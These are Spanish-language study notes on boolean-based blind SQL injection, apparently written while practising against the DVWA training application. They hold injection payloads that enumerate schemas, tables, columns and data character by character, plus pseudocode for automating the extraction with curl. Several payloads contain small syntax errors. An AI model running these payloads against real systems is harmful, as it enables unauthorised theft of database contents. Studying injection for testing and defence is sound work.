1. Identificación del número de bases de datos existentes:

ej = 1' and (select count(schema_name) from information_schema.schemata)=1 -- -

2. Identificación del tamaño de la primera base de datos (cuantas letras tiene):

ej = 1’ and (select length(schema_name) from information_schema.schemata limit 0,1)=1 -- - 
(limit 0,1 -> desde la posicion 0, el primer resultado) 

ej = 1’ and (select length(schema_name) from information_schema.schemata limit0,1)=18 -- - (INFORMATION_SCHEMA siempre es la primera)

3. Obtención de los caracteres que conforma la base de datos (encontrar nombre letra a letra):

ej = 1' and substring((select schema_name from information_schema.schemata limit 2,1),1,1)=‘a' -- -
(limit 2,1 -> la tercera tabla y un solo resultado (empieza en 0)), (limit 1,1 -> el primer caracter del primer resultado)  (limit 2,1 -> segundo caracter...)
(substring hace que cojas solo un caracter)

ej con ascii para comparar con numeros = 1 and ascii(substring((select schema_name from information_schema.schematalimit 2,1),1,1))=100 -- - 



4. Sacar cuantas tablas hay en la bbdd 

ej = 1' and (select count(table_name) from information_schema.tables where table_schema=(nombrebbdd por ej =)'dvwa')=1 -- -

5. Sacar tamaño/num de letras de la tabla que hay en la bbdd 

ej = 1' and (select length(table_name) from information_schema.tables where table_schema='dvwa' limit 0,1)=1 -- -

6. Sacar nombre de la tabla iterando letra a letra

ej = 1' and ascii(substring((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1)1,1))=100 -- -



7. Sacar cuantas columnas hay en la tabla 

ej = ej = 1' and (select count(column_name) from information_schema.columns where table_name='nombretabla')=1 -- -

8. Sacar tamaño/num de letras de la columna 

ej = 1' and (select length(column_name) from information_schema.columns where table_name='nombretabla' limit 0,1)=1 -- -

9. Sacar nombre columna 

ej = 1' and substring((select column_name from information_schema.columns where table_name='nombretabla' limit 0,1)1,1)=a -- -



10. Sacar cuantos campos de datos hay

ej = 1' and (select count(column_name) from 'nombretabla')=1 -- -

11.Sacar num de letras de el campo

ej = 1' and (select length(column_name) from 'dvwa' limit 0,1)=1 -- -
 
12. Sacar nombre del campo

ej = 1' and substring((select 'nombrecolumna' from 'nombretabla' (**where condicion si se quiere**) limit 0,1)3,1)=a -- -


--------------------------------------------------------------------------------------------------------------------------------------

(ver en paquete de resp si cambia: codigo resp http (200, 403, ...), location (en caso de que lo tenga), o si cambia el content length (lo mas habitual que cambie))
-> diferencias entre query buena o mala : codigo(403, 200, etc), location(redirige a algn sitio), o content length(cuantos bytes devuelve)

--------------------------------------------------------------------------------------------------------------------------------------


PSEUDOCODIGO:

(nose si siempre va a ser el inicio "= 1' " para hacer la query correcta)

1. Ver con que query da bien y con cual mal para ver a que hay que estar atentos y comprobar si la query ha sido correcta 

int tamañocorrecto; 
o
int codigo resp correcto; 

2. Funcion checkear url y respuesta de la pagina 

bool checkURL (variable url){
	
	curl url > respWeb.txt 
	tamResp = (wc < fichero.txt)
	
	if(tamResp == tamañocorrecto){
	
		return true/1;
	}else{
	
		return false/0;
	}
	
}

2. Ver cuantas bbdd hay

int numBBDD = 0;
do{
	
	url = 1' and (select count(schema_name) from information_schema.schemata)=numBBDD -- -
	resp = checkURL(url);
	
if(resp == true / 1){
	
	exito = 1
}else{
	
	numBBDD++;
}

}while(exito != 1);
 
3. Ver num letras de las bbdd

TAMMAX_letras = 30;

for(int i = 0; i < numBBDD; i++){
	for(int j = 0; j < TAMMAX_letras){

		url = 1’ and (select length(schema_name) from information_schema.schemata limit i,1)=j -- - 
		resp = checkURL(url);
		
		if(resp == true / 1){
			numletras_bbdd"i" = j;
			j = TAMMAX_letras;
		}
	}

}

4. Ver nombre de las bbdd

TAMMIN_ascii = 48 (si qro empezar por nums) o 65 (si qro empezar por letra A)
TAMMAX_ascii = 122 (=z)

for(int i = 0; i < numBBDD; i++){
	for(int j = 0; j < numletras_bbdd"i+1"; j++){ //este alomejor tiene que empezar por 1 //maximo a buscar es el num d letras q haya 									    sacado 				              antes
		for(int k = TAMMIN_ascii; k < TAMMAX_ascii; k++){

			url = 1 and ascii(substring((select schema_name from information_schema.schemata limit i,1),j,1))=k -- -  
			resp = checkURL(url);
		
			if(resp == true / 1){
				
				if(j == 0 o 1){ //segun cual sea
					palabraBBDD"i" = k
				}else{
					palabraBBDD"i" = palabra + "," + k
				}
				
				k = TAMMAX_ascii;
			}
		}

	}

}


